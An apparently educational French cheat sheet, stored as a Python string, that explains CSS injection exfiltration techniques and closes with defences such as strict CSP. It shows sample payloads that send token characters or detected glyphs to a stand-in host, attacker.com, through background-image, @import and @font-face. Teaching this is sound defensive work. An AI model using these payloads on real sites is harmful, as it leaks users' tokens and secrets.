CONTENT = """\nCSS Injection (Injection CSS)

Définition pédagogique :

Une CSS Injection est une vulnérabilité qui apparaît lorsqu’une application permet l’injection de CSS non contrôlé dans une page web.

Cela peut être exploité pour :
- exfiltrer des données sensibles (CSRF tokens, secrets, etc.)
- manipuler le rendu de la page
- déclencher des requêtes vers un serveur attaquant en fonction du contenu de la page


==================================================
RÉSUMÉ
==================================================

Outils
Méthodologie
Sélecteurs CSS
@import CSS
Conditions CSS
@font-face
Extraction via attr()
Ligatures
Labs
Références


==================================================
OUTILS
==================================================

blind-css-exfiltration : exfiltration via CSS
css-exfiltration : techniques d’exfiltration CSS
css-scrollbar-attack : fuite via scrollbars
sic (Sequential Import Chaining) : attaques avancées CSS
fontleak : exfiltration via ligatures et polices


==================================================
MÉTHODOLOGIE
==================================================

Idée générale :

Le CSS peut être utilisé comme canal d’exfiltration.

Pourquoi ?
Parce que le navigateur :
- charge automatiquement des ressources CSS
- peut envoyer des requêtes réseau (background-image, fonts, import)
- réagit au contenu HTML via les sélecteurs CSS


==================================================
CSS SELECTORS (SÉLECTEURS CSS)
==================================================

Explication :

Les sélecteurs CSS permettent de cibler des éléments selon leurs attributs.

On peut les utiliser pour deviner un secret caractère par caractère.

Exemples de sélecteurs :

input[value^="a"]  → commence par "a"
input[value$="a"]  → finit par "a"
input[value*="a"]  → contient "a"


Exemple d’attaque :

input[value^="TOKEN_012"] {
  background-image: url(http://attacker.com/?data=TOKEN_012);
}

Explication :

Si la condition est vraie :
→ le navigateur charge une image externe
→ donc il envoie une requête à l’attaquant
→ fuite de l’information


Optimisation :

On peut combiner plusieurs sélecteurs pour accélérer le bruteforce (prefix + suffix).


==================================================
CSS IMPORT (@import)
==================================================

Explication :

@import permet de charger une feuille CSS externe.

Exemple :

@import url(http://attacker.com/staging);

Utilité en attaque :

- permet d’exfiltrer des données sans JS
- déclenche des requêtes réseau automatiquement


Séquentiel (SIC) :

Le serveur répond dynamiquement :
- étape 1 : test
- étape 2 : analyse réponse
- étape 3 : nouveau payload

On crée une boucle d’extraction progressive sans recharger la page.


==================================================
CSS CONDITIONS
==================================================

Explication :

CSS moderne permet des conditions logiques via variables et fonctions.

On peut tester la valeur d’un attribut et déclencher une requête.

Exemple conceptuel :

Si valeur = "1" → requête /1
Si valeur = "2" → requête /2


Utilité :

- exfiltration logique
- bruteforce automatisé dans CSS
- attaque sans JavaScript


==================================================
@FONT-FACE (POLICES)
==================================================

Explication :

@font-face permet de charger des polices personnalisées.

Avec unicode-range, on peut détecter des caractères.

Exemple :

@font-face {
  font-family: test;
  src: url(attacker.com/A);
  unicode-range: U+0041;
}

Explication :

Si le caractère "A" existe dans la page :
→ la police est chargée
→ donc requête vers attacker.com


Limites :
- ne donne pas l’ordre des caractères
- détecte seulement présence


==================================================
ATTR() (EXTRACTION D’ATTRIBUTS)
==================================================

Explication :

La fonction attr() récupère la valeur d’un attribut HTML.

Exemple :

input[name="password"] {
  background: image-set(attr(value));
}

Explication :

- la valeur de l’attribut est interprétée comme ressource
- le navigateur tente de charger une URL
- fuite possible de données sensibles


Résultat :
le serveur attaquant reçoit la valeur du champ


==================================================
LIGATURES
==================================================

Explication :

Les ligatures combinent plusieurs caractères en une seule forme visuelle.

Idée d’attaque :
- créer une police personnalisée
- détecter si une combinaison de lettres existe
- observer le rendu (taille, scroll, largeur)


Utilité :

- exfiltration très précise
- détection de chaînes complètes
- bypass de protections classiques


==================================================
CONCLUSION
==================================================

La CSS Injection est dangereuse car :

- elle ne nécessite pas JavaScript
- elle exploite uniquement le comportement du navigateur
- elle peut exfiltrer des données sensibles silencieusement

Impact :

- fuite de tokens CSRF
- vol de données internes
- reconnaissance de contenu page
- exfiltration de secrets

Défense :

- désactiver CSS injectable utilisateur
- CSP stricte (Content-Security-Policy)
- éviter styles dynamiques basés sur input utilisateur
- isoler les données sensibles du DOM

Conclusion pédagogique :

CSS n’est pas seulement un outil de design.

C’est aussi un vecteur d’attaque indirect puissant,
car il peut provoquer des requêtes réseau sans script."""